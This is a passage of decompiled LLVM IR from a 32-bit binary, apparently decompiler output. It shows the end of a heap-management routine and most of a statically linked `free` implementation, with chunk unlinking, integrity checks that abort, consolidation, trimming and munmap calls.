  %v0_8052c37 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052c37 = urem i32 %v0_8052c37, 2
  %v2_8052c37 = icmp eq i32 %v1_8052c37, 0
  store i32 %v1_8052c37, i32* %eax.global-to-local, align 4
  %v1_8052c3c = icmp eq i1 %v2_8052c37, false
  br i1 %v1_8052c3c, label %dec_label_pc_8052c5d, label %dec_label_pc_8052c3e

dec_label_pc_8052c3e:                             ; preds = %dec_label_pc_8052c30
  %v0_8052c3e = load i32, i32* @ebx, align 4
  %v1_8052c3e = add i32 %v0_8052c3e, 8
  %v2_8052c3e = inttoptr i32 %v1_8052c3e to i32*
  %v3_8052c3e = load i32, i32* %v2_8052c3e, align 4
  store i32 %v3_8052c3e, i32* @edx, align 4
  %v1_8052c41 = add i32 %v0_8052c3e, 12
  %v2_8052c41 = inttoptr i32 %v1_8052c41 to i32*
  %v3_8052c41 = load i32, i32* %v2_8052c41, align 4
  store i32 %v3_8052c41, i32* %eax.global-to-local, align 4
  %v1_8052c44 = add i32 %v3_8052c3e, 12
  %v2_8052c44 = inttoptr i32 %v1_8052c44 to i32*
  %v3_8052c44 = load i32, i32* %v2_8052c44, align 4
  store i32 %v3_8052c44, i32* @esi, align 4
  %v12_8052c47 = icmp eq i32 %v3_8052c44, %v0_8052c3e
  %v1_8052c49 = icmp eq i1 %v12_8052c47, false
  br i1 %v1_8052c49, label %dec_label_pc_8052c50, label %dec_label_pc_8052c4b

dec_label_pc_8052c4b:                             ; preds = %dec_label_pc_8052c3e
  %v1_8052c4b = add i32 %v3_8052c41, 8
  %v2_8052c4b = inttoptr i32 %v1_8052c4b to i32*
  %v3_8052c4b = load i32, i32* %v2_8052c4b, align 4
  %v15_8052c4b = icmp eq i32 %v3_8052c4b, %v3_8052c44
  br i1 %v15_8052c4b, label %dec_label_pc_8052c55, label %dec_label_pc_8052c50

dec_label_pc_8052c50:                             ; preds = %dec_label_pc_8052c4b, %dec_label_pc_8052c3e, %dec_label_pc_8052c13, %dec_label_pc_8052c00
  %v0_8052c50 = call i32 @abort()
  store i32 %v0_8052c50, i32* %eax.global-to-local, align 4
  %v1_8052c57.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052c55

dec_label_pc_8052c55:                             ; preds = %dec_label_pc_8052c4b, %dec_label_pc_8052c50
  %v1_8052c57 = phi i32 [ %v3_8052c3e, %dec_label_pc_8052c4b ], [ %v1_8052c57.pre, %dec_label_pc_8052c50 ]
  %v0_8052c57 = phi i32 [ %v3_8052c41, %dec_label_pc_8052c4b ], [ %v0_8052c50, %dec_label_pc_8052c50 ]
  %v0_8052c55 = load i32, i32* @edi, align 4
  %v1_8052c55 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8052c55 = add i32 %v1_8052c55, %v0_8052c55
  store i32 %v2_8052c55, i32* @edi, align 4
  %v2_8052c57 = add i32 %v1_8052c57, 12
  %v3_8052c57 = inttoptr i32 %v2_8052c57 to i32*
  store i32 %v0_8052c57, i32* %v3_8052c57, align 4
  %v0_8052c5a = load i32, i32* @edx, align 4
  %v1_8052c5a = load i32, i32* %eax.global-to-local, align 4
  %v2_8052c5a = add i32 %v1_8052c5a, 8
  %v3_8052c5a = inttoptr i32 %v2_8052c5a to i32*
  store i32 %v0_8052c5a, i32* %v3_8052c5a, align 4
  br label %dec_label_pc_8052c5d

dec_label_pc_8052c5d:                             ; preds = %dec_label_pc_8052c30, %dec_label_pc_8052c55
  store i32 %v1_8052ba8, i32* %eax.global-to-local, align 4
  %v3_8052c61 = load i32, i32* %v2_8052c61, align 4
  store i32 %v3_8052c61, i32* @edx, align 4
  %v0_8052c64 = load i32, i32* @ecx, align 4
  store i32 %v0_8052c64, i32* %v2_8052c61, align 4
  %v0_8052c67 = load i32, i32* @edi, align 4
  %v1_8052c69 = or i32 %v0_8052c67, 1
  store i32 %v1_8052c69, i32* %eax.global-to-local, align 4
  %v0_8052c6c = load i32, i32* @ecx, align 4
  %v1_8052c6c = load i32, i32* @edx, align 4
  %v2_8052c6c = add i32 %v1_8052c6c, 12
  %v3_8052c6c = inttoptr i32 %v2_8052c6c to i32*
  store i32 %v0_8052c6c, i32* %v3_8052c6c, align 4
  %v0_8052c6f = load i32, i32* %eax.global-to-local, align 4
  %v1_8052c6f = load i32, i32* @ecx, align 4
  %v2_8052c6f = add i32 %v1_8052c6f, 4
  %v3_8052c6f = inttoptr i32 %v2_8052c6f to i32*
  store i32 %v0_8052c6f, i32* %v3_8052c6f, align 4
  store i32 %v1_8052ba8, i32* %eax.global-to-local, align 4
  %v0_8052c76 = load i32, i32* @edx, align 4
  %v1_8052c76 = load i32, i32* @ecx, align 4
  %v2_8052c76 = add i32 %v1_8052c76, 8
  %v3_8052c76 = inttoptr i32 %v2_8052c76 to i32*
  store i32 %v0_8052c76, i32* %v3_8052c76, align 4
  %v0_8052c79 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052c79 = load i32, i32* @ecx, align 4
  %v2_8052c79 = add i32 %v1_8052c79, 12
  %v3_8052c79 = inttoptr i32 %v2_8052c79 to i32*
  store i32 %v0_8052c79, i32* %v3_8052c79, align 4
  %v0_8052c7c = load i32, i32* @edi, align 4
  %v1_8052c7c = load i32, i32* @ecx, align 4
  %v3_8052c7c = add i32 %v1_8052c7c, %v0_8052c7c
  %v4_8052c7c = inttoptr i32 %v3_8052c7c to i32*
  store i32 %v0_8052c7c, i32* %v4_8052c7c, align 4
  br label %dec_label_pc_8052c91

dec_label_pc_8052c81:                             ; preds = %dec_label_pc_8052c20
  %v0_8052c81 = load i32, i32* @edi, align 4
  %v2_8052c81 = add i32 %v0_8052c81, %v1_8052c28
  %v1_8052c84 = or i32 %v2_8052c81, 1
  store i32 %v1_8052c84, i32* %eax.global-to-local, align 4
  %v1_8052c87 = load i32, i32* @ecx, align 4
  %v2_8052c87 = add i32 %v1_8052c87, 4
  %v3_8052c87 = inttoptr i32 %v2_8052c87 to i32*
  store i32 %v1_8052c84, i32* %v3_8052c87, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_8052c8e = load i32, i32* @ecx, align 4
  store i32 %v0_8052c8e, i32* %v3_8052c8e, align 4
  br label %dec_label_pc_8052c91

dec_label_pc_8052c91:                             ; preds = %dec_label_pc_8052c5d, %dec_label_pc_8052c81
  store i32 %v3_8052be3, i32* @ecx, align 4
  %v1_8052c95 = icmp eq i32 %v3_8052be3, 0
  %v1_8052c97 = icmp eq i1 %v1_8052c95, false
  br i1 %v1_8052c97, label %dec_label_pc_8052be3, label %dec_label_pc_8052c9d

dec_label_pc_8052c9d:                             ; preds = %dec_label_pc_8052c91, %dec_label_pc_8052bcf
  store i32 %v4_8052bc7, i32* @ecx, align 4
  %v15_8052ca1 = icmp eq i32 %v0_8052bdd, %v4_8052bc7
  br i1 %v15_8052ca1, label %dec_label_pc_8052d25, label %dec_label_pc_8052ca7

dec_label_pc_8052ca7:                             ; preds = %dec_label_pc_8052c9d
  %v4_8052ca7 = add i32 %v0_8052bdd, 4
  br label %dec_label_pc_8052bcf

dec_label_pc_8052cb1:                             ; preds = %dec_label_pc_8052cc0.preheader, %dec_label_pc_8052cb1
  %v1_8052cb520 = phi i32 [ 1, %dec_label_pc_8052cc0.preheader ], [ %v0_8052cc0.pre, %dec_label_pc_8052cb1 ]
  %v2_8052cb5 = mul i32 %v1_8052cb520, 8
  %v4_8052cb5 = add i32 %v3_8052cb5, %v2_8052cb5
  store i32 %v4_8052cb5, i32* %eax.global-to-local, align 4
  %v1_8052cb9 = add i32 %v1_8052cb520, 1
  store i32 %v1_8052cb9, i32* %edx.global-to-local, align 4
  %v2_8052cba = add i32 %v4_8052cb5, 12
  %v3_8052cba = inttoptr i32 %v2_8052cba to i32*
  store i32 %v4_8052cb5, i32* %v3_8052cba, align 4
  %v0_8052cbd = load i32, i32* %eax.global-to-local, align 4
  %v2_8052cbd = add i32 %v0_8052cbd, 8
  %v3_8052cbd = inttoptr i32 %v2_8052cbd to i32*
  store i32 %v0_8052cbd, i32* %v3_8052cbd, align 4
  %v0_8052cc0.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_8052cc3 = icmp sgt i32 %v0_8052cc0.pre, 95
  br i1 %v7_8052cc3, label %dec_label_pc_8052cc5, label %dec_label_pc_8052cb1

dec_label_pc_8052cc5:                             ; preds = %dec_label_pc_8052cb1
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8052cc9 = add i32 %tmp11, 864
  %v2_8052cc9 = inttoptr i32 %v1_8052cc9 to i32*
  %v3_8052cc9 = load i32, i32* %v2_8052cc9, align 4
  %v4_8052cc9 = or i32 %v3_8052cc9, 1
  store i32 %v4_8052cc9, i32* %v2_8052cc9, align 4
  %v0_8052cd0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052cd0 = add i32 %v0_8052cd0, 840
  %v2_8052cd0 = inttoptr i32 %v1_8052cd0 to i32*
  store i32 0, i32* %v2_8052cd0, align 4
  %v0_8052cda = load i32, i32* %eax.global-to-local, align 4
  %v1_8052cda = add i32 %v0_8052cda, 852
  %v2_8052cda = inttoptr i32 %v1_8052cda to i32*
  store i32 65536, i32* %v2_8052cda, align 4
  %v0_8052ce4 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052ce4 = add i32 %v0_8052ce4, 844
  %v2_8052ce4 = inttoptr i32 %v1_8052ce4 to i32*
  store i32 262144, i32* %v2_8052ce4, align 4
  %v0_8052cee = load i32, i32* %eax.global-to-local, align 4
  %v1_8052cee = add i32 %v0_8052cee, 836
  %v2_8052cee = inttoptr i32 %v1_8052cee to i32*
  store i32 262144, i32* %v2_8052cee, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_8052cff = load i32, i32* %arg1, align 4
  %v1_8052d01 = urem i32 %v2_8052cff, 4
  %v1_8052d04 = or i32 %v1_8052d01, 72
  store i32 %v1_8052d04, i32* %arg1, align 4
  %v0_8052d09 = load i32, i32* @edx, align 4
  %v1_8052d0b = add i32 %v0_8052d09, 52
  store i32 %v1_8052d0b, i32* %eax.global-to-local, align 4
  %v2_8052d0e = add i32 %v0_8052d09, 44
  %v3_8052d0e = inttoptr i32 %v2_8052d0e to i32*
  store i32 %v1_8052d0b, i32* %v3_8052d0e, align 4
  %v1_8052d13 = call i32 @sysconf(i32 30)
  store i32 %v1_8052d13, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_8052d1f = add i32 %tmp11, 860
  %v3_8052d1f = inttoptr i32 %v2_8052d1f to i32*
  store i32 %v1_8052d13, i32* %v3_8052d1f, align 4
  br label %dec_label_pc_8052d25

dec_label_pc_8052d25:                             ; preds = %dec_label_pc_8052c9d, %dec_label_pc_8052cc5
  store i32 %v0_8052b88, i32* @ebx, align 4
  store i32 %v0_8052b87, i32* @esi, align 4
  store i32 %v0_8052b86, i32* @edi, align 4
  %v0_8052d2c = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8052d2c

; uselistorder directives
  uselistorder i32 %v0_8052cbd, { 1, 0 }
  uselistorder i32 %v0_8052c7c, { 1, 0 }
  uselistorder i32 %v1_8052c37, { 1, 0 }
  uselistorder i32 %v2_8052c30, { 1, 0 }
  uselistorder i32 %v1_8052c28, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8052c34, { 1, 0 }
  uselistorder i32 %v3_8052be3, { 2, 1, 3, 0 }
  uselistorder i32 %v0_8052c00, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8052bdd, { 1, 0, 3, 2 }
  uselistorder i32* %v3_8052c8e, { 1, 0 }
  uselistorder i32 %v1_8052ba8, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_8052d25, { 1, 0 }
  uselistorder label %dec_label_pc_8052cb1, { 1, 0 }
  uselistorder label %dec_label_pc_8052c91, { 1, 0 }
  uselistorder label %dec_label_pc_8052c5d, { 1, 0 }
  uselistorder label %dec_label_pc_8052c55, { 1, 0 }
  uselistorder label %dec_label_pc_8052c20, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8052d2d = load i32, i32* @ebp, align 4
  %v0_8052d2e = load i32, i32* @edi, align 4
  %v0_8052d2f = load i32, i32* @esi, align 4
  %v0_8052d30 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8052d38 = icmp eq i32 %arg1, 0
  br i1 %v1_8052d38, label %dec_label_pc_8052ec1, label %dec_label_pc_8052d40

dec_label_pc_8052d40:                             ; preds = %entry
  %v2_8052d4b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8052d4b, i32* @eax, align 4
  %v2_8052d50 = call i32 @__pthread_return_void(i32 %v2_8052d4b, i32 134560279)
  store i32 %v2_8052d50, i32* %eax.global-to-local, align 4
  %v1_8052d5c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8061430.730 to i32))
  %v1_8052d61 = add i32 %arg1, -8
  store i32 %v1_8052d61, i32* @ecx, align 4
  %v0_8052d64 = load i8, i8* @global_var_80678a0.731, align 1
  %v1_8052d64 = sext i8 %v0_8052d64 to i32
  store i32 %v1_8052d64, i32* %eax.global-to-local, align 4
  %v1_8052d6c = add i32 %arg1, -4
  %v2_8052d6c = inttoptr i32 %v1_8052d6c to i32*
  %v3_8052d6c = load i32, i32* %v2_8052d6c, align 4
  %v1_8052d71 = and i32 %v3_8052d6c, -4
  %v4_8052d71 = trunc i32 %v1_8052d71 to i8
  store i32 %v1_8052d71, i32* @ebx, align 4
  %v8_8052d76 = icmp ugt i8 %v4_8052d71, %v0_8052d64
  br i1 %v8_8052d76, label %dec_label_pc_8052d98, label %dec_label_pc_8052d78

dec_label_pc_8052d78:                             ; preds = %dec_label_pc_8052d40
  %v2_8052d78 = udiv i32 %v3_8052d6c, 8
  %v1_8052d7b = or i32 %v1_8052d64, 3
  %v3_8052d7b = trunc i32 %v1_8052d7b to i8
  store i32 %v1_8052d7b, i32* %eax.global-to-local, align 4
  store i8 %v3_8052d7b, i8* @global_var_80678a0.731, align 32
  %v1_8052d83 = mul nuw i32 %v2_8052d78, 4
  %v2_8052d83 = add i32 %v1_8052d83, ptrtoint (i8* @global_var_80678a0.731 to i32)
  store i32 %v2_8052d83, i32* @edx, align 4
  %v1_8052d8a = add i32 %v1_8052d83, add (i32 ptrtoint (i8* @global_var_80678a0.731 to i32), i32 -4)
  %v2_8052d8a = inttoptr i32 %v1_8052d8a to i32*
  %v3_8052d8a = load i32, i32* %v2_8052d8a, align 4
  store i32 %v3_8052d8a, i32* %eax.global-to-local, align 4
  %v3_8052d8d = inttoptr i32 %arg1 to i32*
  store i32 %v3_8052d8a, i32* %v3_8052d8d, align 4
  %v0_8052d90 = load i32, i32* @ecx, align 4
  %v1_8052d90 = load i32, i32* @edx, align 4
  %v2_8052d90 = add i32 %v1_8052d90, -4
  %v3_8052d90 = inttoptr i32 %v2_8052d90 to i32*
  store i32 %v0_8052d90, i32* %v3_8052d90, align 4
  br label %dec_label_pc_8052eb0

dec_label_pc_8052d98:                             ; preds = %dec_label_pc_8052d40
  %v1_8052d98 = trunc i32 %v3_8052d6c to i8
  %v2_8052d98 = and i8 %v1_8052d98, 2
  %v3_8052d98 = icmp eq i8 %v2_8052d98, 0
  %v5_8052d98 = zext i8 %v2_8052d98 to i32
  %v7_8052d98 = and i32 %v3_8052d6c, -256
  %v8_8052d98 = or i32 %v5_8052d98, %v7_8052d98
  store i32 %v8_8052d98, i32* @edx, align 4
  %v1_8052d9b = icmp eq i1 %v3_8052d98, false
  br i1 %v1_8052d9b, label %dec_label_pc_8052e90, label %dec_label_pc_8052da1

dec_label_pc_8052da1:                             ; preds = %dec_label_pc_8052d98
  %v1_8052da1 = or i32 %v1_8052d64, 1
  %v3_8052da1 = trunc i32 %v1_8052da1 to i8
  store i32 %v1_8052da1, i32* %eax.global-to-local, align 4
  %v2_8052da4 = add i32 %v1_8052d71, %v1_8052d61
  store i32 %v2_8052da4, i32* @esi, align 4
  store i8 %v3_8052da1, i8* @global_var_80678a0.731, align 32
  %v1_8052dac = add i32 %v2_8052da4, 4
  %v2_8052dac = inttoptr i32 %v1_8052dac to i32*
  %v3_8052dac = load i32, i32* %v2_8052dac, align 4
  store i32 %v3_8052dac, i32* %eax.global-to-local, align 4
  %v2_8052db3 = inttoptr i32 %v1_8052d6c to i8*
  %v3_8052db3 = load i8, i8* %v2_8052db3, align 1
  %v4_8052db3 = urem i8 %v3_8052db3, 2
  %v5_8052db3 = icmp eq i8 %v4_8052db3, 0
  %v1_8052db7 = icmp eq i1 %v5_8052db3, false
  br i1 %v1_8052db7, label %dec_label_pc_8052dda, label %dec_label_pc_8052db9

dec_label_pc_8052db9:                             ; preds = %dec_label_pc_8052da1
  %v2_8052db9 = inttoptr i32 %v1_8052d61 to i32*
  %v3_8052db9 = load i32, i32* %v2_8052db9, align 4
  store i32 %v3_8052db9, i32* @ebp, align 4
  %v2_8052dbe = sub i32 %v1_8052d61, %v3_8052db9
  store i32 %v2_8052dbe, i32* %eax.global-to-local, align 4
  %v1_8052dc0 = add i32 %v2_8052dbe, 8
  %v2_8052dc0 = inttoptr i32 %v1_8052dc0 to i32*
  %v3_8052dc0 = load i32, i32* %v2_8052dc0, align 4
  store i32 %v3_8052dc0, i32* @edi, align 4
  %v1_8052dc3 = add i32 %v2_8052dbe, 12
  %v2_8052dc3 = inttoptr i32 %v1_8052dc3 to i32*
  %v3_8052dc3 = load i32, i32* %v2_8052dc3, align 4
  store i32 %v3_8052dc3, i32* @edx, align 4
  %v1_8052dc6 = add i32 %v3_8052dc0, 12
  %v2_8052dc6 = inttoptr i32 %v1_8052dc6 to i32*
  %v3_8052dc6 = load i32, i32* %v2_8052dc6, align 4
  store i32 %v3_8052dc6, i32* @ecx, align 4
  %v12_8052dc9 = icmp eq i32 %v3_8052dc6, %v2_8052dbe
  %v1_8052dcb = icmp eq i1 %v12_8052dc9, false
  br i1 %v1_8052dcb, label %dec_label_pc_8052e09, label %dec_label_pc_8052dcd

dec_label_pc_8052dcd:                             ; preds = %dec_label_pc_8052db9
  %v1_8052dcd = add i32 %v3_8052dc3, 8
  %v2_8052dcd = inttoptr i32 %v1_8052dcd to i32*
  %v3_8052dcd = load i32, i32* %v2_8052dcd, align 4
  %v15_8052dcd = icmp eq i32 %v3_8052dcd, %v3_8052dc6
  %v1_8052dd0 = icmp eq i1 %v15_8052dcd, false
  br i1 %v1_8052dd0, label %dec_label_pc_8052e09, label %dec_label_pc_8052dd2

dec_label_pc_8052dd2:                             ; preds = %dec_label_pc_8052dcd
  %v2_8052dd2 = add i32 %v3_8052db9, %v1_8052d71
  store i32 %v2_8052dd2, i32* @ebx, align 4
  store i32 %v3_8052dc3, i32* %v2_8052dc6, align 4
  %v0_8052dd7 = load i32, i32* @edi, align 4
  %v1_8052dd7 = load i32, i32* @edx, align 4
  %v2_8052dd7 = add i32 %v1_8052dd7, 8
  %v3_8052dd7 = inttoptr i32 %v2_8052dd7 to i32*
  store i32 %v0_8052dd7, i32* %v3_8052dd7, align 4
  %v0_8052de1.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052dda

dec_label_pc_8052dda:                             ; preds = %dec_label_pc_8052da1, %dec_label_pc_8052dd2
  %v1_8052ded = phi i32 [ %v2_8052da4, %dec_label_pc_8052da1 ], [ %v0_8052de1.pre, %dec_label_pc_8052dd2 ]
  %v1_8052dde = and i32 %v3_8052dac, -4
  store i32 %v1_8052dde, i32* @ebp, align 4
  %v1_8052de1 = load i32, i32* @global_var_80678cc.732, align 4
  %v12_8052de1 = icmp eq i32 %v1_8052ded, %v1_8052de1
  br i1 %v12_8052de1, label %dec_label_pc_8052e3b, label %dec_label_pc_8052de9

dec_label_pc_8052de9:                             ; preds = %dec_label_pc_8052dda
  %v2_8052de9 = add i32 %v1_8052ded, 4
  %v3_8052de9 = add i32 %v2_8052de9, %v1_8052dde
  %v4_8052de9 = inttoptr i32 %v3_8052de9 to i32*
  %v5_8052de9 = load i32, i32* %v4_8052de9, align 4
  store i32 %v5_8052de9, i32* %eax.global-to-local, align 4
  %v3_8052ded = inttoptr i32 %v2_8052de9 to i32*
  store i32 %v1_8052dde, i32* %v3_8052ded, align 4
  %v0_8052df0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052df0 = urem i32 %v0_8052df0, 2
  %v2_8052df0 = icmp eq i32 %v1_8052df0, 0
  store i32 %v1_8052df0, i32* %eax.global-to-local, align 4
  %v1_8052df5 = icmp eq i1 %v2_8052df0, false
  br i1 %v1_8052df5, label %dec_label_pc_8052e16, label %dec_label_pc_8052df7

dec_label_pc_8052df7:                             ; preds = %dec_label_pc_8052de9
  %v0_8052df7 = load i32, i32* @esi, align 4
  %v1_8052df7 = add i32 %v0_8052df7, 8
  %v2_8052df7 = inttoptr i32 %v1_8052df7 to i32*
  %v3_8052df7 = load i32, i32* %v2_8052df7, align 4
  store i32 %v3_8052df7, i32* @edx, align 4
  %v1_8052dfa = add i32 %v0_8052df7, 12
  %v2_8052dfa = inttoptr i32 %v1_8052dfa to i32*
  %v3_8052dfa = load i32, i32* %v2_8052dfa, align 4
  store i32 %v3_8052dfa, i32* %eax.global-to-local, align 4
  %v1_8052dfd = add i32 %v3_8052df7, 12
  %v2_8052dfd = inttoptr i32 %v1_8052dfd to i32*
  %v3_8052dfd = load i32, i32* %v2_8052dfd, align 4
  store i32 %v3_8052dfd, i32* @edi, align 4
  %v12_8052e00 = icmp eq i32 %v3_8052dfd, %v0_8052df7
  %v1_8052e02 = icmp eq i1 %v12_8052e00, false
  br i1 %v1_8052e02, label %dec_label_pc_8052e09, label %dec_label_pc_8052e04

dec_label_pc_8052e04:                             ; preds = %dec_label_pc_8052df7
  %v1_8052e04 = add i32 %v3_8052dfa, 8
  %v2_8052e04 = inttoptr i32 %v1_8052e04 to i32*
  %v3_8052e04 = load i32, i32* %v2_8052e04, align 4
  %v15_8052e04 = icmp eq i32 %v3_8052e04, %v3_8052dfd
  br i1 %v15_8052e04, label %dec_label_pc_8052e0e, label %dec_label_pc_8052e09

dec_label_pc_8052e09:                             ; preds = %dec_label_pc_8052e04, %dec_label_pc_8052df7, %dec_label_pc_8052dcd, %dec_label_pc_8052db9
  %v0_8052e09 = call i32 @abort()
  store i32 %v0_8052e09, i32* %eax.global-to-local, align 4
  %v1_8052e0e.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052e0e

dec_label_pc_8052e0e:                             ; preds = %dec_label_pc_8052e04, %dec_label_pc_8052e09
  %v1_8052e0e = phi i32 [ %v3_8052df7, %dec_label_pc_8052e04 ], [ %v1_8052e0e.pre, %dec_label_pc_8052e09 ]
  %v0_8052e0e = phi i32 [ %v3_8052dfa, %dec_label_pc_8052e04 ], [ %v0_8052e09, %dec_label_pc_8052e09 ]
  %v2_8052e0e = add i32 %v1_8052e0e, 12
  %v3_8052e0e = inttoptr i32 %v2_8052e0e to i32*
  store i32 %v0_8052e0e, i32* %v3_8052e0e, align 4
  %v0_8052e11 = load i32, i32* @edx, align 4
  %v1_8052e11 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052e11 = add i32 %v1_8052e11, 8
  %v3_8052e11 = inttoptr i32 %v2_8052e11 to i32*
  store i32 %v0_8052e11, i32* %v3_8052e11, align 4
  %v0_8052e14 = load i32, i32* @ebx, align 4
  %v1_8052e14 = load i32, i32* @ebp, align 4
  %v2_8052e14 = add i32 %v1_8052e14, %v0_8052e14
  store i32 %v2_8052e14, i32* @ebx, align 4
  br label %dec_label_pc_8052e16

dec_label_pc_8052e16:                             ; preds = %dec_label_pc_8052de9, %dec_label_pc_8052e0e
  %v0_8052e16 = load i32, i32* @global_var_80678dc.750, align 4
  store i32 %v0_8052e16, i32* %eax.global-to-local, align 4
  %v0_8052e1b = load i32, i32* @ecx, align 4
  %v1_8052e1b = add i32 %v0_8052e1b, 12
  %v2_8052e1b = inttoptr i32 %v1_8052e1b to i32*
  store i32 ptrtoint (i32* @global_var_80678d4.734 to i32), i32* %v2_8052e1b, align 4
  %v0_8052e22 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052e22 = load i32, i32* @ecx, align 4
  %v2_8052e22 = add i32 %v1_8052e22, 8
  %v3_8052e22 = inttoptr i32 %v2_8052e22 to i32*
  store i32 %v0_8052e22, i32* %v3_8052e22, align 4
  %v0_8052e25 = load i32, i32* @ebx, align 4
  %v1_8052e25 = load i32, i32* @ecx, align 4
  %v3_8052e25 = add i32 %v1_8052e25, %v0_8052e25
  %v4_8052e25 = inttoptr i32 %v3_8052e25 to i32*
  store i32 %v0_8052e25, i32* %v4_8052e25, align 4
  %v0_8052e28 = load i32, i32* @ecx, align 4
  %v1_8052e28 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052e28 = add i32 %v1_8052e28, 12
  %v3_8052e28 = inttoptr i32 %v2_8052e28 to i32*
  store i32 %v0_8052e28, i32* %v3_8052e28, align 4
  %v0_8052e2b = load i32, i32* @ebx, align 4
  %v1_8052e2d = or i32 %v0_8052e2b, 1
  store i32 %v1_8052e2d, i32* %eax.global-to-local, align 4
  %v0_8052e30 = load i32, i32* @ecx, align 4
  store i32 %v0_8052e30, i32* @global_var_80678dc.750, align 4
  %v2_8052e36 = add i32 %v0_8052e30, 4
  %v3_8052e36 = inttoptr i32 %v2_8052e36 to i32*
  store i32 %v1_8052e2d, i32* %v3_8052e36, align 4
  br label %dec_label_pc_8052e4b

dec_label_pc_8052e3b:                             ; preds = %dec_label_pc_8052dda
  %v0_8052e3b = load i32, i32* @ebx, align 4
  %v2_8052e3b = add i32 %v0_8052e3b, %v1_8052dde
  store i32 %v2_8052e3b, i32* @ebx, align 4
  %v1_8052e3f = or i32 %v2_8052e3b, 1
  store i32 %v1_8052e3f, i32* %eax.global-to-local, align 4
  %v1_8052e42 = load i32, i32* @ecx, align 4
  %v2_8052e42 = add i32 %v1_8052e42, 4
  %v3_8052e42 = inttoptr i32 %v2_8052e42 to i32*
  store i32 %v1_8052e3f, i32* %v3_8052e42, align 4
  %v0_8052e45 = load i32, i32* @ecx, align 4
  store i32 %v0_8052e45, i32* @global_var_80678cc.732, align 4
  br label %dec_label_pc_8052e4b

dec_label_pc_8052e4b:                             ; preds = %dec_label_pc_8052e16, %dec_label_pc_8052e3b
  %v0_8052e4b = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_8052e4b, 131072
  br i1 %tmp21, label %dec_label_pc_8052eb0, label %dec_label_pc_8052e53

dec_label_pc_8052e53:                             ; preds = %dec_label_pc_8052e4b
  %v0_8052e53 = load i8, i8* @global_var_80678a0.731, align 32
  %v1_8052e53 = and i8 %v0_8052e53, 2
  %v2_8052e53 = icmp eq i8 %v1_8052e53, 0
  br i1 %v2_8052e53, label %dec_label_pc_8052e6c, label %dec_label_pc_8052e5c

dec_label_pc_8052e5c:                             ; preds = %dec_label_pc_8052e53
  %v2_8052e64 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_80678a0.731 to i32*))
  store i32 %v2_8052e64, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052e6c

dec_label_pc_8052e6c:                             ; preds = %dec_label_pc_8052e53, %dec_label_pc_8052e5c
  %v0_8052e6c = load i32, i32* @global_var_80678cc.732, align 4
  store i32 %v0_8052e6c, i32* %eax.global-to-local, align 4
  %v1_8052e71 = add i32 %v0_8052e6c, 4
  %v2_8052e71 = inttoptr i32 %v1_8052e71 to i32*
  %v3_8052e71 = load i32, i32* %v2_8052e71, align 4
  %v1_8052e74 = and i32 %v3_8052e71, -4
  store i32 %v1_8052e74, i32* %eax.global-to-local, align 4
  %v1_8052e77 = load i32, i32* @global_var_8067be4.748, align 4
  %v7_8052e77 = icmp ult i32 %v1_8052e74, %v1_8052e77
  br i1 %v7_8052e77, label %dec_label_pc_8052eb0, label %dec_label_pc_8052e7f

dec_label_pc_8052e7f:                             ; preds = %dec_label_pc_8052e6c
  store i32 ptrtoint (i8* @global_var_80678a0.731 to i32), i32* @edx, align 4
  %v0_8052e84 = load i32, i32* @global_var_8067be8.746, align 8
  store i32 %v0_8052e84, i32* @eax, align 4
  %v0_8052e89 = call i32 @__malloc_trim()
  store i32 %v0_8052e89, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052eb0

dec_label_pc_8052e90:                             ; preds = %dec_label_pc_8052d98
  %v2_8052e90 = inttoptr i32 %v1_8052d61 to i32*
  %v3_8052e90 = load i32, i32* %v2_8052e90, align 4
  %v0_8052e93 = load i32, i32* @global_var_8067bf0.739, align 16
  %v1_8052e93 = add i32 %v0_8052e93, -1
  store i32 %v1_8052e93, i32* @global_var_8067bf0.739, align 16
  %v2_8052e99 = add i32 %v3_8052e90, %v1_8052d71
  store i32 %v2_8052e99, i32* %eax.global-to-local, align 4
  %v2_8052e9c = sub i32 %v1_8052d61, %v3_8052e90
  %v0_8052ea2 = load i32, i32* @global_var_8067c04.742, align 4
  %v2_8052ea2 = sub i32 %v0_8052ea2, %v2_8052e99
  store i32 %v2_8052ea2, i32* @global_var_8067c04.742, align 4
  %v4_8052ea8 = call i32 @munmap(i32 %v2_8052e9c, i32 %v2_8052e99, i32 %v1_8052d71, i32 %v1_8052d71)
